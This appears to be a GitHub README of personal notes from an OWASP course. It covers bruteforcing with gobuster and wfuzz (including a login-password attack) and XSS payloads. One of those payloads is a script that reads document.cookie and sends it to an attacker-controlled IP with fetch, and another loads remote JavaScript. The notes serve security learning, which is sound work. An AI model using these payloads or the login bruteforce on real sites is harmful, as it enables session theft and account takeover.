# OWASP Course Notes Repository

This repository contains my personal notes from the recently released OWASP course, which consists of video lessons. I created this repository on GitHub to store the notes that will be useful to me in the future.

---

# CEWL - Wordlist Generation

To generate dictionaries, use the cewl tool.

---

# Gobuster - Directory and Subdomain Bruteforcing

Gobuster is a tool that helps with directory and subdomain bruteforcing.
Repository: https://github.com/OJ/gobuster
Installation command:
```
go install github.com/OJ/gobuster/v3@latest
```
Example usage:

```
gobuster dir -u http://188.72.108.59:10008/ -w /usr/share/dirb/wordlists/common.txt -t 5
gobuster dns -d <site.com> -w /usr/share/dirb/wordlists/common.txt #subdomains
```

--- 

# Wfuzz - File and Login Page Bruteforcing

Wfuzz is a tool for file and login page bruteforcing.

Example usage:

```
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 301,404,403 "<site.com>" #files discovery
wfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt -hc 404 -d "username=admin&password=FUZZ" -hh <number of incorrect bytes> "<site.com>" #bruteforce login page
```

# XSS (Cross-Site Scripting)

Reflected XSS: Creating a malicious link that needs to be sent to someone.
Stored XSS: Embedding a trap directly into the website.

Examples:
If you need to create an alert in an `<h1>` tag:

```
<img src='x' onerror='alert(1)'>
```

Injection:

```
<script src="http://<ip of your box>/xss.js"></script>
```

Cookie Stealing and Data Exfiltration

To obtain the cookie file:

```
let cookie = document.cookie;
let encodedCookie = encodeURIComponent(cookie);
fetch("http://<ip>/exfil?data=" + encodedCookie);
```

Contribution

Feel free to contribute to this repository by adding more notes or suggesting improvements.